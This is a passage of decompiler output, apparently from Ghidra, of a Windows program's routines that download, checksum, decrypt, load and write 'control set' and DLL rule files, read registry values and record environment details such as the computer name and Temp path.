  undefined4 in_stack_00001528;
  LPCSTR in_stack_0000153c;
  LPCSTR in_stack_00001540;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  uVar1 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &stack0xfffffff4;
  FUN_00415a50((char)uVar1);
  FUN_00412030(&local_4,*(undefined4 *)((int)this + 0x14));
  FUN_00409c20(&stack0x00000110,*(undefined4 *)((int)this + 0x14));
  FUN_004090c0((undefined4 *)&stack0xfffffff4);
  FUN_0041546e(&stack0x00000528,(byte *)s__s__s_0040460c);
  iVar3 = FUN_004123b0(&local_4,(HKEY)0x80000002,in_stack_0000153c,in_stack_00001540,
                       (LPBYTE)&param_2);
  if (iVar3 == 0) {
    bVar2 = FUN_00413399(*(int *)((int)this + 0x14),&stack0x00000528);
    if (CONCAT31(extraout_var,bVar2) == 0) {
      FUN_0041546e(&stack0x00000010,(byte *)s_CONTROL_file___s__does_NOT_exist_004048dc);
      uVar9 = SUB41(&stack0x00000010,0);
    }
    else {
      FUN_0041546e(&stack0x00000010,(byte *)s_CONTROL_file___s__found__004048b0);
      FUN_004116e9(*(int *)((int)this + 0x14),(char)&stack0x00000010,s_ControlSet_00404368,
                   s_Load_ControlSet_004048cc,&stack0x00000010);
      iVar3 = FUN_00409ce0(&stack0x00000110,&stack0x00000528);
      if (iVar3 == 0) {
        iVar3 = FUN_00409ec0((int)&stack0x00000110);
        *(int *)((int)this + 0xc) = iVar3;
        if (iVar3 == param_2) {
          FUN_0041546e(&stack0x00000010,(byte *)s_Checksum_verified_for_CONTROL_fi_004047d8);
          FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_01,s_ControlSet_00404368,
                       s_Load_ControlSet_004048cc,&stack0x00000010);
          goto LAB_0040acb9;
        }
        FUN_0041546e(&stack0x00000010,(byte *)s_Invalid_checksum_on_CONTROL_file_00404828);
        uVar9 = extraout_DL_00;
      }
      else {
        FUN_0041546e(&stack0x00000010,(byte *)s_Error_loading_CONTROL_file___s__f_00404874);
        uVar9 = extraout_DL;
      }
    }
LAB_0040abda:
    FUN_004116e9(*(int *)((int)this + 0x14),uVar9,s_ControlSet_00404368,s_Load_ControlSet_004048cc,
                 &stack0x00000010);
  }
  else {
LAB_0040acb9:
    FUN_0041546e(&stack0x00000010,(byte *)s_Processing_control_set_file___s__004047b4);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_02,s_ControlSet_00404368,
                 s_Load_ControlSet_004048cc,&stack0x00000010);
    ppbVar4 = (byte **)FUN_004154e0(&stack0x00000528,&DAT_004041b8);
    if (ppbVar4 == (byte **)0x0) {
      FUN_0041546e(&stack0x00000010,(byte *)s_Error_opening_control_set_file___00404780);
      uVar9 = extraout_DL_03;
      goto LAB_0040abda;
    }
    FUN_004153e2((char **)ppbVar4,0,2);
    puVar5 = (uint *)FUN_0041528a((char **)ppbVar4);
    FUN_004153e2((char **)ppbVar4,0,0);
    puVar6 = (uint *)FUN_00415216(puVar5);
    if (puVar6 == (uint *)0x0) {
      FUN_0041546e(&stack0x00000010,(byte *)s_Error_allocating__ld_bytes_for_c_00404748);
      FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_04,s_ControlSet_00404368,
                   s_Load_ControlSet_004048cc,&stack0x00000010);
      FUN_004150d8((int *)ppbVar4);
    }
    else {
      puVar7 = puVar6;
      for (uVar8 = (uint)puVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
        *puVar7 = 0;
        puVar7 = puVar7 + 1;
      }
      for (uVar8 = (uint)puVar5 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
        *(undefined *)puVar7 = 0;
        puVar7 = (uint *)((int)puVar7 + 1);
      }
      puVar7 = (uint *)FUN_0041512e(puVar6,1,(uint)puVar5,ppbVar4);
      if (puVar7 == puVar5) {
        FUN_004150d8((int *)ppbVar4);
        FUN_00409900(&stack0xfffffff4,0x4041bc,ram0x004041e0);
        uVar8 = FUN_00409a30((uint)puVar5);
        puVar10 = (uint *)(uVar8 + 0x10);
        param_3 = puVar10;
        puVar7 = (uint *)FUN_00415216(puVar10);
        if (puVar7 != (uint *)0x0) {
          puVar11 = puVar7;
          for (uVar8 = (uint)puVar10 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
            *puVar11 = 0;
            puVar11 = puVar11 + 1;
          }
          for (uVar8 = (uint)puVar10 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
            *(undefined *)puVar11 = 0;
            puVar11 = (uint *)((int)puVar11 + 1);
          }
          FUN_00409b90(&stack0xfffffff4,puVar6,puVar7,(int)puVar5);
          iVar3 = FUN_0040a3b0(this,puVar7);
          FUN_004150a9(puVar6);
          FUN_004150a9(puVar7);
          FUN_004090e0((LPVOID *)&stack0xfffffff4);
          FUN_00409ca0((undefined4 *)&stack0x00000110);
          FUN_0041205e(&local_4);
          goto LAB_0040af39;
        }
        FUN_0041546e(&stack0x00000010,(byte *)s_Error_allocating__ld_bytes_for_c_004046dc);
        FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_05,s_ControlSet_00404368,
                     s_Load_ControlSet_004048cc,&stack0x00000010);
        FUN_004150a9(puVar6);
      }
      else {
        FUN_0041546e(&stack0x00000010,(byte *)s_Error_reading_control_set_file___00404720);
        FUN_004116e9(*(int *)((int)this + 0x14),(char)&stack0x00000010,s_ControlSet_00404368,
                     s_Load_ControlSet_004048cc,&stack0x00000010);
        FUN_004150a9(puVar6);
        FUN_004150d8((int *)ppbVar4);
      }
    }
  }
  FUN_004090e0((LPVOID *)&stack0xfffffff4);
  FUN_00409ca0((undefined4 *)&stack0x00000110);
  FUN_0041205e(&local_4);
  iVar3 = -1;
LAB_0040af39:
  *unaff_FS_OFFSET = in_stack_00001528;
  return iVar3;
}



uint FUN_0040af60(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,undefined param_11,undefined param_12,
                 char param_13)

{
  char cVar1;
  bool bVar2;
  uint *puVar3;
  DWORD DVar4;
  undefined4 uVar5;
  undefined3 extraout_var;
  int extraout_ECX;
  uint uVar6;
  uint uVar7;
  undefined extraout_DL;
  int iVar8;
  undefined4 *puVar9;
  int iVar10;
  char *pcVar11;
  char *pcVar12;
  undefined4 *puVar13;
  undefined4 *unaff_FS_OFFSET;
  undefined4 in_stack_00001160;
  undefined4 in_stack_00001170;
  uint uVar14;
  uint local_8;
  undefined4 local_4;
  
  uVar5 = *unaff_FS_OFFSET;
  local_4 = 0xffffffff;
  *unaff_FS_OFFSET = &stack0xfffffff4;
  FUN_00415a50((char)uVar5);
  FUN_0040bd00(&local_4,*(undefined4 *)(extraout_ECX + 0x14));
  iVar8 = 0;
  uVar14 = 0;
  FUN_00409c20(&param_12,*(undefined4 *)(extraout_ECX + 0x14));
  FUN_0040be00(&local_4,in_stack_00001170);
  local_8 = 0;
  if (*(int *)(extraout_ECX + 0x10) != 0) {
    do {
      uVar6 = 0xffffffff;
      pcVar11 = (char *)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4));
      do {
        pcVar12 = pcVar11;
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        pcVar12 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar12;
      } while (cVar1 != '\0');
      uVar6 = ~uVar6;
      puVar9 = (undefined4 *)(pcVar12 + -uVar6);
      puVar13 = (undefined4 *)&param_2;
      for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {
        *puVar13 = *puVar9;
        puVar9 = puVar9 + 1;
        puVar13 = puVar13 + 1;
      }
      for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined *)puVar13 = *(undefined *)puVar9;
        puVar9 = (undefined4 *)((int)puVar9 + 1);
        puVar13 = (undefined4 *)((int)puVar13 + 1);
      }
      puVar3 = FUN_00415540((uint *)&param_2,'\0');
      *(undefined *)((int)puVar3 + -1) = 0x5f;
      FUN_0041546e(&stack0x00000960,(byte *)s__s__s_00404924);
      iVar10 = 0;
      while( true ) {
        iVar10 = iVar10 + 1;
        DVar4 = FUN_0040c070();
        if (DVar4 == 0) break;
        if (iVar10 == 5) {
          if (DVar4 != 0) goto LAB_0040b154;
          break;
        }
        Sleep(5000);
      }
      puVar9 = (undefined4 *)&param_13;
      for (iVar10 = 0x100; iVar10 != 0; iVar10 = iVar10 + -1) {
        *puVar9 = 0;
        puVar9 = puVar9 + 1;
      }
      FUN_00414c18(*(int *)(extraout_ECX + 0x14),8,&param_13);
      if (param_13 != '\0') {
        FUN_0041546e((char *)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)),(byte *)s__s_DLL_0040491c);
      }
      iVar10 = FUN_00414c8a(*(int *)(extraout_ECX + 0x14),&param_2,
                            (LPCSTR)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)));
      FUN_0041340f(*(int *)(extraout_ECX + 0x14),&param_2);
      if (iVar10 == 0) {
        FUN_00414601(*(int *)(extraout_ECX + 0x14),
                     (LPCSTR)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)),(byte **)&DAT_004041e4);
        iVar10 = FUN_00409ce0(&param_12,(LPCSTR)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)));
        if (iVar10 != 0) {
          FUN_0041546e(&param_11,(byte *)s_Error_loading_DLL_file___s__for_c_00404690);
          FUN_004116e9(*(int *)(extraout_ECX + 0x14),extraout_DL,s_ControlSet_00404368,
                       s_Download_Rules_0040490c,&param_11);
          goto LAB_0040b154;
        }
        uVar5 = FUN_00409ec0((int)&param_12);
        *(undefined4 *)(iVar8 + 0x444 + *(int *)(extraout_ECX + 4)) = uVar5;
        FUN_0041546e(&stack0x00000d60,(byte *)s__s__s_0040460c);
        bVar2 = FUN_00414270(*(int *)(extraout_ECX + 0x14),
                             (LPCSTR)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)),&stack0x00000d60);
        FUN_0041340f(*(int *)(extraout_ECX + 0x14),
                     (byte *)(iVar8 + 0x44 + *(int *)(extraout_ECX + 4)));
        if (CONCAT31(extraout_var,bVar2) != 0) goto LAB_0040b154;
        *(undefined4 *)(iVar8 + 0x448 + *(int *)(extraout_ECX + 4)) = 1;
      }
      else {
LAB_0040b154:
        *(undefined4 *)(iVar8 + 0x448 + *(int *)(extraout_ECX + 4)) = 0;
        uVar14 = uVar14 | 1 << ((byte)local_8 & 0x1f);
      }
      local_8 = local_8 + 1;
      iVar8 = iVar8 + 0x450;
    } while (local_8 < *(uint *)(extraout_ECX + 0x10));
  }
  FUN_00409ca0((undefined4 *)&param_12);
  FUN_0040bd40(&local_4);
  *unaff_FS_OFFSET = in_stack_00001160;
  return uVar14;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __thiscall FUN_0040b260(void *this,undefined4 param_1,undefined4 param_2)

{
  char cVar1;
  DWORD DVar2;
  uint *puVar3;
  int iVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar6;
  uint *puVar7;
  uint *puVar8;
  undefined4 *unaff_FS_OFFSET;
  char *pcVar9;
  uint *local_64c;
  uint local_648;
  LPVOID local_644 [2];
  undefined4 local_63c [3];
  uint *local_630;
  int local_62c;
  uint local_628;
  char local_624 [256];
  char local_524 [256];
  undefined4 local_424 [262];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041df81;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_0040bd00(local_63c,*(undefined4 *)((int)this + 0x14));
  local_4 = 0;
  local_64c = (uint *)0x0;
  local_628 = 0x1000;
  local_630 = (uint *)0x0;
  local_648 = 0x1000;
  FUN_00409c20(local_424,*(undefined4 *)((int)this + 0x14));
  local_4._0_1_ = 1;
  FUN_004090c0(local_644);
  local_4 = CONCAT31(local_4._1_3_,2);
  FUN_0040be00(local_63c,param_1);
  FUN_0041546e(local_524,&DAT_00404a54);
  DVar2 = FUN_0040be90(local_63c,local_524,&local_64c,&local_628);
  if (DVar2 == 0) {
    puVar3 = FUN_00415a80(local_64c,s_<control__00404a18);
    if (puVar3 == (uint *)0x0) {
      FUN_0041546e(local_624,(byte *)s_control_set_checksum_not_found_i_004049ec);
      FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL,s_ControlSet_00404368,
                   s_Download_ControlSet_004049d8,local_624);
      FUN_0040be70((int)local_63c);
      if (local_64c != (uint *)0x0) {
        FUN_004150a9(local_64c);
      }
    }
    else {
      uVar5 = 0xffffffff;
      pcVar9 = s_<control__00404a18;
      do {
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      FUN_004154f3((uint *)((int)puVar3 + (~uVar5 - 1)),&DAT_0040424c);
      if (local_64c != (uint *)0x0) {
        FUN_004150a9(local_64c);
      }
      FUN_0041546e(local_524,(byte *)s__s__s_00404924);
      DVar2 = FUN_0040be90(local_63c,local_524,&local_630,&local_648);
      if (DVar2 != 0) {
        pcVar9 = s_Error_downloading_control_set____004049b0;
        goto LAB_0040b412;
      }
      FUN_0040be70((int)local_63c);
      iVar4 = FUN_00409f10(local_424,(byte *)local_630,local_648);
      *(int *)((int)this + 0xc) = iVar4;
      if (iVar4 == local_62c) {
        FUN_00409900(local_644,0x4041bc,ram0x004041e0);
        uVar5 = FUN_00409a30(local_648);
        puVar7 = (uint *)(uVar5 + 0x10);
        puVar3 = (uint *)FUN_00415216(puVar7);
        if (puVar3 != (uint *)0x0) {
          puVar8 = puVar3;
          for (uVar5 = (uint)puVar7 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
            *puVar8 = 0;
            puVar8 = puVar8 + 1;
          }
          for (uVar5 = (uint)puVar7 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
            *(undefined *)puVar8 = 0;
            puVar8 = (uint *)((int)puVar8 + 1);
          }
          FUN_00409b90(local_644,local_630,puVar3,local_648);
          iVar4 = FUN_0040a3b0(this,puVar3);
          FUN_004150a9(puVar3);
          local_4._0_1_ = 1;
          FUN_004090e0(local_644);
          local_4 = (uint)local_4._1_3_ << 8;
          FUN_00409ca0(local_424);
          local_4 = 0xffffffff;
          FUN_0040bd40(local_63c);
          goto LAB_0040b5a7;
        }
        FUN_0041546e(local_624,(byte *)s_Error_allocating__ld_bytes_for_c_0040492c);
        uVar6 = SUB41(local_624,0);
      }
      else {
        FUN_0041546e(local_624,(byte *)s_Calculated_checksum_0x__2x_does_n_00404968);
        uVar6 = extraout_DL_00;
      }
      FUN_004116e9(*(int *)((int)this + 0x14),uVar6,s_ControlSet_00404368,
                   s_Download_ControlSet_004049d8,local_624);
    }
  }
  else {
    pcVar9 = s_Error_downloading_control_set_ch_00404a24;
LAB_0040b412:
    FUN_0041546e(local_624,(byte *)pcVar9);
    FUN_004116e9(*(int *)((int)this + 0x14),(char)local_624,s_ControlSet_00404368,
                 s_Download_ControlSet_004049d8,local_624);
    FUN_0040be70((int)local_63c);
  }
  local_4._0_1_ = 1;
  FUN_004090e0(local_644);
  local_4 = (uint)local_4._1_3_ << 8;
  FUN_00409ca0(local_424);
  local_4 = 0xffffffff;
  FUN_0040bd40(local_63c);
  iVar4 = -1;
LAB_0040b5a7:
  *unaff_FS_OFFSET = local_c;
  return iVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4
FUN_0040b5d0(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined param_10,undefined param_11,undefined param_12)

{
  uint *puVar1;
  uint *puVar2;
  uint *puVar3;
  uint *puVar4;
  char **ppcVar5;
  undefined4 uVar6;
  int extraout_ECX;
  uint uVar7;
  int iVar8;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  uint *puVar9;
  uint *puVar10;
  undefined4 *unaff_FS_OFFSET;
  undefined4 in_stack_00001524;
  LPCSTR in_stack_00001538;
  LPCSTR in_stack_0000153c;
  LPCSTR in_stack_00001540;
  LPVOID local_4;
  
  local_4 = (LPVOID)0xffffffff;
  uVar6 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &stack0xfffffff4;
  FUN_00415a50((char)uVar6);
  FUN_004090c0(&local_4);
  FUN_00412030(&param_1,*(undefined4 *)(extraout_ECX + 0x14));
  FUN_00409c20(&param_11,*(undefined4 *)(extraout_ECX + 0x14));
  puVar9 = (uint *)(*(int *)(extraout_ECX + 0x10) * 0x460 + 0x20);
  puVar1 = (uint *)FUN_00415216(puVar9);
  if (puVar1 == (uint *)0x0) {
    FUN_0041546e(&param_3,(byte *)s_Error_allocating__ld_bytes_for_t_00404b34);
    FUN_004116e9(*(int *)(extraout_ECX + 0x14),extraout_DL,s_ControlSet_00404368,
                 s_Write_ControlSet_00404b20,&param_3);
  }
  else {
    uVar7 = (uint)puVar9 >> 2;
    puVar9 = puVar1;
    for (; uVar7 != 0; uVar7 = uVar7 - 1) {
      *puVar9 = 0;
      puVar9 = puVar9 + 1;
    }
    for (iVar8 = 0; iVar8 != 0; iVar8 = iVar8 + -1) {
      *(undefined *)puVar9 = 0;
      puVar9 = (uint *)((int)puVar9 + 1);
    }
    FUN_0041546e((char *)puVar1,&DAT_00404b18);
    uVar7 = 0;
    puVar9 = puVar1;
    if (*(int *)(extraout_ECX + 0x10) != 0) {
      do {
        puVar9 = FUN_00415540(puVar9,'\0');
        FUN_0041546e((char *)puVar9,(byte *)s__s___2d__s__x_00404b08);
        uVar7 = uVar7 + 1;
      } while (uVar7 < *(uint *)(extraout_ECX + 0x10));
    }
    puVar2 = FUN_00415540(puVar9,'\0');
    FUN_00409900(&local_4,0x4041bc,ram0x004041e0);
    puVar3 = (uint *)FUN_00409a30((int)puVar2 - (int)puVar1);
    puVar9 = puVar3;
    puVar4 = (uint *)FUN_00415216(puVar3);
    if (puVar4 == (uint *)0x0) {
      FUN_0041546e(&param_3,(byte *)s_Error_allocating__ld_bytes_for_c_00404ad0);
      FUN_004116e9(*(int *)(extraout_ECX + 0x14),extraout_DL_00,s_ControlSet_00404368,
                   s_Write_ControlSet_00404b20,&param_3);
      FUN_004150a9(puVar1);
    }
    else {
      puVar10 = puVar4;
      for (uVar7 = (uint)puVar3 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
      for (uVar7 = (uint)puVar3 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
        *(undefined *)puVar10 = 0;
        puVar10 = (uint *)((int)puVar10 + 1);
      }
      FUN_00409a50(&local_4,puVar1,puVar4,(int)puVar2 - (int)puVar1);
      FUN_0041546e(&param_12,(byte *)s__s__s_0040460c);
      ppcVar5 = (char **)FUN_004154e0(&param_12,&DAT_00404acc);
      if (ppcVar5 == (char **)0x0) {
        FUN_0041546e(&param_3,(byte *)s_Error_opening_control_set_file___00404a98);
        FUN_004116e9(*(int *)(extraout_ECX + 0x14),extraout_DL_01,s_ControlSet_00404368,
                     s_Write_ControlSet_00404b20,&param_3);
        FUN_004150a9(puVar1);
        FUN_004150a9(puVar4);
      }
      else {
        puVar2 = (uint *)FUN_00415b00(puVar4,1,(uint)puVar9,ppcVar5);
        if (puVar2 == puVar9) {
          uVar6 = FUN_00409f10(&param_11,(byte *)puVar4,(int)puVar9);
          *(undefined4 *)(extraout_ECX + 0xc) = uVar6;
          FUN_004150d8((int *)ppcVar5);
          FUN_004150a9(puVar1);
          FUN_004125fb(&param_1,(HKEY)0x80000002,in_stack_00001538,in_stack_0000153c,
                       *(undefined4 *)(extraout_ECX + 8));
          FUN_004125fb(&param_1,(HKEY)0x80000002,in_stack_00001538,in_stack_00001540,
                       *(undefined4 *)(extraout_ECX + 0xc));
          FUN_00409ca0((undefined4 *)&param_11);
          FUN_0041205e((undefined4 *)&param_1);
          FUN_004090e0(&local_4);
          uVar6 = 0;
          goto LAB_0040b973;
        }
        FUN_0041546e(&param_3,(byte *)s_Error_writing__ld_bytes_to_contr_00404a58);
        FUN_004116e9(*(int *)(extraout_ECX + 0x14),extraout_DL_02,s_ControlSet_00404368,
                     s_Write_ControlSet_00404b20,&param_3);
        FUN_004150a9(puVar1);
        FUN_004150a9(puVar4);
        FUN_004150d8((int *)ppcVar5);
      }
    }
  }
  FUN_00409ca0((undefined4 *)&param_11);
  FUN_0041205e((undefined4 *)&param_1);
  FUN_004090e0(&local_4);
  uVar6 = 0xffffffff;
LAB_0040b973:
  *unaff_FS_OFFSET = in_stack_00001524;
  return uVar6;
}



undefined4 * __thiscall FUN_0040b990(void *this,int param_1)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined4 *puVar5;
  char *pcVar6;
  undefined4 *puVar7;
  char local_100 [256];
  
  uVar3 = 0xffffffff;
  *(undefined ***)this = &PTR_FUN_004011d0;
  pcVar2 = s____undefined____00404cf0;
  do {
    pcVar6 = pcVar2;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar6 = pcVar2 + 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar6;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar6 + -uVar3);
  puVar7 = (undefined4 *)((int)this + 0x28);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar7 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  uVar3 = 0xffffffff;
  pcVar2 = s__Progra_1_00404cdc;
  do {
    pcVar6 = pcVar2;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar6 = pcVar2 + 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar6;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar6 + -uVar3);
  puVar7 = (undefined4 *)((int)this + 0xa8);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar7 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  pcVar2 = FUN_00415c0a((uint *)&DAT_00404ce8);
  *(char **)((int)this + 0x20) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(undefined4 **)((int)this + 0x20) = (undefined4 *)((int)this + 0x28);
  }
  FUN_0041546e(local_100,(byte *)s__Temp_____s__00404cc0);
  FUN_004116e9(param_1,extraout_DL,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)&DAT_00404ca0);
  *(char **)((int)this + 0x24) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(int *)((int)this + 0x24) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__Tmp_____s__00404c84);
  FUN_004116e9(param_1,extraout_DL_00,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_windir_00404c7c);
  *(char **)((int)this + 0x18) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    pcVar2 = FUN_00415c0a((uint *)s_SystemRoot_00404c70);
    *(char **)((int)this + 0x18) = pcVar2;
  }
  if (*(int *)((int)this + 0x18) == 0) {
    *(int *)((int)this + 0x18) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__WinDir_____s__00404c54);
  FUN_004116e9(param_1,extraout_DL_01,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_SystemRoot_00404c70);
  *(char **)((int)this + 0x10) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(undefined4 *)((int)this + 0x10) = *(undefined4 *)((int)this + 0x18);
  }
  if (*(int *)((int)this + 0x10) == 0) {
    *(int *)((int)this + 0x10) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__SystemRoot_____s__00404c38);
  FUN_004116e9(param_1,extraout_DL_02,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_SystemDrive_00404c2c);
  *(char **)((int)this + 0xc) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    uVar3 = 0xffffffff;
    pcVar2 = *(char **)((int)this + 0x18);
    do {
      pcVar6 = pcVar2;
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      pcVar6 = pcVar2 + 1;
      cVar1 = *pcVar2;
      pcVar2 = pcVar6;
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    puVar5 = (undefined4 *)(pcVar6 + -uVar3);
    puVar7 = (undefined4 *)((int)this + 0x68);
    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
      *puVar7 = *puVar5;
      puVar5 = puVar5 + 1;
      puVar7 = puVar7 + 1;
    }
    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar7 = *(undefined *)puVar5;
      puVar5 = (undefined4 *)((int)puVar5 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    }
    *(undefined *)((int)this + 0x6a) = 0;
    *(undefined4 **)((int)this + 0xc) = (undefined4 *)((int)this + 0x68);
  }
  if (*(int *)((int)this + 0xc) == 0) {
    *(int *)((int)this + 0xc) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__SystemDrive_____s__00404c10);
  FUN_004116e9(param_1,extraout_DL_03,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_ProgramFiles_00404c00);
  *(char **)((int)this + 0x1c) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(int *)((int)this + 0x1c) = (int)this + 0xa8;
  }
  FUN_0041546e(local_100,(byte *)s__ProgramFiles_____s__00404be4);
  FUN_004116e9(param_1,extraout_DL_04,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_COMPUTERNAME_00404bd4);
  *(char **)((int)this + 4) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(int *)((int)this + 4) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__ComputerName_____s__00404bb8);
  FUN_004116e9(param_1,extraout_DL_05,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)&DAT_00404bb4);
  *(char **)((int)this + 8) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(int *)((int)this + 8) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__OperatingSystem_____s__00404b98);
  FUN_004116e9(param_1,extraout_DL_06,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  pcVar2 = FUN_00415c0a((uint *)s_HOMEPATH_00404b8c);
  *(char **)((int)this + 0x14) = pcVar2;
  if (pcVar2 == (char *)0x0) {
    *(int *)((int)this + 0x14) = (int)this + 0x28;
  }
  FUN_0041546e(local_100,(byte *)s__HomePath_____s__00404b70);
  FUN_004116e9(param_1,extraout_DL_07,s_Environment_00404ca4,s_CEnvironment_00404cb0,local_100);
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040bcd0(void *this,byte param_1)

{
  FUN_0040bcf0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040bcf0(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004011d0;
  return;
}



void __thiscall FUN_0040bd00(void *this,undefined4 param_1)

{
  *(undefined ***)this = &PTR_FUN_004011d4;
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = param_1;
  return;
}



undefined4 * __thiscall FUN_0040bd20(void *this,byte param_1)

{
  FUN_0040bd40((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040bd40(undefined4 *param_1)

{
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar1;
  
  *param_1 = &PTR_FUN_004011d4;
  FUN_004116e9(param_1[2],in_DL,s_Internet_00404d14,s__CInternet_00404d20,
               s_Before_closing_the_handle_00404d2c);
  uVar1 = extraout_DL;
  if (param_1[1] != 0) {
    InternetCloseHandle(param_1[1]);
    uVar1 = extraout_DL_00;
  }
  FUN_004116e9(param_1[2],uVar1,s_Internet_00404d14,s__CInternet_00404d20,
               s_Closed_the_handle_00404d00);
  return;
}



undefined4 __fastcall FUN_0040bd90(int param_1)

{
  undefined4 uVar1;
  undefined extraout_DL;
  int unaff_EDI;
  char *pcVar2;
  int local_4;
  
  local_4 = param_1;
  uVar1 = InternetGetConnectedState(&local_4,0);
